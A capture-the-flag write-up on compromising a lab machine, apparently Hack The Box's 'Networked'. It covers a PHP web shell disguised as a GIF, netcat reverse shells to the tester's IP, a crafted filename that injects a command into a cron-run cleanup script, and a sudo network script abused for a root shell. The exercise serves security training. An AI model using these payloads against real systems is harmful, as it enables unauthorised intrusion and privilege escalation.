## Nmap

I've got two open port and one closed port. Obviously we'll start our enumeration with HTTP service.

***

## HTTP

When we visit the IP in our browser we get a very simple web page with nothing fancy, just some text.

![](images/website.png)

So I ran `gobuster` on the website and found few directories.

![](images/gobuster.png)

First I checked the `/backup` directory and it had a `.tar` file in there.

![](images/backup.png)

That file had 4 files named

* `lib.php`
* `index.php`
* `photos.php`
* `upload.php`

Now if we try to visit `/upload.php` on the website we get option to upload a file. I tried uploading a `phpbash` shell but got error about the `Invalid image file`.

![](images/error.png)

This is means we need to upload our shell in an image file so I made a file name `shell.php.gif` having the following content.

```php
GIF89a;
<?php system($_GET['cmd']);?>
```

Then uploaded it. This file can be found on `/uploads` + `it is your IP address (with '.' replaced by '_') plus the extension`.

So my interface IP is `10.10.14.225` and the file I uploaded was `shell.php.gif` so my file will be found on `/uploads/10_10_14_225.php.gif`.

![](images/rce.png)

Now we have the RCE, using that we can get a shell:

```bash
âžœ http http://10.10.10.146/uploads/10_10_14_225.php.gif\?cmd\="nc -e /bin/sh 10.10.14.225 4444"
```

I tried reading the user flag but got `permission denied`

## Horizontal privilege escalation

In `/home/guly` I found a php file named `check_attack.php`

```php
<?php
require '/var/www/html/lib.php';
$path = '/var/www/html/uploads/';
$logpath = '/tmp/attack.log';
$to = 'guly';
$msg= '';
$headers = "X-Mailer: check_attack.php\r\n";

$files = array();
$files = preg_grep('/^([^.])/', scandir($path));

foreach ($files as $key => $value) {
        $msg='';
  if ($value == 'index.html') {
        continue;
  }
  #echo "-------------\n";

  #print "check: $value\n";
  list ($name,$ext) = getnameCheck($value);
  $check = check_ip($name,$value);

  if (!($check[0])) {
    echo "attack!\n";
    # todo: attach file
    file_put_contents($logpath, $msg, FILE_APPEND | LOCK_EX);

    exec("rm -f $logpath");
    exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");
    echo "rm -f $path$value\n";
    mail($to, $msg, $msg, $headers, "-F$value");
  }
}
```

The vulnerability that we are going to use here is in `exec("rm -f $logpath")`
Basically this `check_attack.php` is trying to remove the files in `/var/www/html/uploads` directory. So if we name file `hello.php;ls` it will run command as the user `guly`.

so I did

```bash
$ touch /"var/www/html/uploads/shell.php;nc -c bash 10.10.14.225 1337"
```
Then start the listener and wait because the `check_attack.php` is ran by a cronjob. After few minutes I got the shell as user `gully`

Now I can get the user hash.

## Lateral Privilege Escalation

I ran `sudo -l` to see if this user have some sudo rights or not.

![](images/sudo-right.png)

We can see that `guly` can run `/usr/local/sbin/changename.sh` as root.

Following is the content of that file

```bash
#!/bin/bash -p
cat > /etc/sysconfig/network-scripts/ifcfg-guly << EoF
DEVICE=guly0
ONBOOT=no
NM_CONTROLLED=no
EoF

regexp="^[a-zA-Z0-9_\ /-]+$"

for var in NAME PROXY_METHOD BROWSER_ONLY BOOTPROTO; do
        echo "interface $var:"
        read x
        while [[ ! $x =~ $regexp ]]; do
                echo "wrong input, try again"
                echo "interface $var:"
                read x
        done
        echo $var=$x >> /etc/sysconfig/network-scripts/ifcfg-guly
done

/sbin/ifup guly0
```

Just run the script and focus on the out.

![](images/output.png)

It asks for inputs like name, interface etc. The important thing is that it takes input. So we can try something like `;nc -c /bin/sh 10.10.14.225 4444`. But if we give that as input we'll get error saying `wrong input` cause there is regex in the source i.e `regexp="^[a-zA-Z0-9_\ /-]+$"` so we cannot use anything other then those chars.

To bypass this I made a file called `shell` with the following data in it:

```bash
$ echo "nc -e /bin/sh 10.10.14.225 4444" > shell
$ chmod +x shell
```

![](images/make-shell.png)

Then in place of `NAME` I ented `bash /home/guly/shell` and entered radnom things in other inputs and BOOM ðŸ’¥ðŸ’¥ðŸ’¥

![](images/exp.png)

This gives us a `root reverse shell`.

![](images/root-shell.png)

Now we can grab the root flag.

This was really a fun machine. Nothing was supposed to be `guessed`. From the initial foothold to privilege escalation everything is sensible.
